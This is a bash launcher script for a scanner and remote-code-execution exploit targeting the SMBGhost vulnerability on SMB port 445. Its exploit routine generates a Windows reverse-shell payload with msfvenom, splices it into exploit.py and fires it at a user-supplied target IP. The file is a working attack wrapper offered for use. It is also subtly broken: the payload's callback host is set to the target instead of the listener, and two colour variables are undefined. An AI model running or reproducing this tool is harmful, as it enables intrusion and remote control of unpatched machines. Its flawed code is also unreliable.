#!/bin/bash

ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
IN='USER_PAYLOAD'
OUT='buf'

cd /opt/SMBGhost_RCE_PoC
scanner(){
    echo -e "${ORNG}"
    figlet -f mini "SMBGhost Scanner"
    echo -e "${NC}"
    cd /opt/SMBGhost
    echo -e "${W}Please enter the target IP address or IP Range${NC}"
    read TARGET
    python3 scanner.py ${TARGET} 445
}

exploit(){
    echo -e "${ORNG}"
    figlet -f mini "SMBGhost Exploit"
    echo -e "${NC}"
    cd /opt/SMBGhost_RCE_PoC
    echo -e "${W}Please enter the IP of listener${NC}"
    read LISTENER
    echo -e "${W}Please enter the port of listener${NC}"
    read PORT
    echo -e "${W}Please enter the target IP${NC}"
    read TARGET
    echo -e "${YLW}An xterm window will pop-up and generate shellcode & then copy the\nraw shellcode & paste it into the section named ${ORNG}USER_PAYLOAD ${YLW}as is.\n(${RED}'buf' ${YLW}will be replaced with ${ORNG}'USER_PAYLOAD' ${YLW}automatically')${NC}"
    xterm -e msfvenom -p windows/shell_reverse_tcp LHOST=${TARGET} LPORT=${PORT} -f py -b '\x00\x0a\x0d\x20'
    sleep 2
    sudo nano exploit.py
    sleep 1
    sed -i "s/${OUT}/${IN}/g" exploit.py
    sleep 1
    python exploit.py -ip ${TARGET}
}

PS3='Which module would you like to use?'
    options=("Scanner" "Exploit" "Back")
    select opt in "${options[@]}"
        do
            case $opt in
                "Scanner")
                    scanner
                    ;;

                "Exploit")
                    exploit
                    ;;

                "Back")
                    exit
                    ;;

            esac
        done
    echo -e "${NC}"

sleep 5


##########################______________ czFsM250NzggX18gUmFiYjE3J3MgRGVu ______________##########################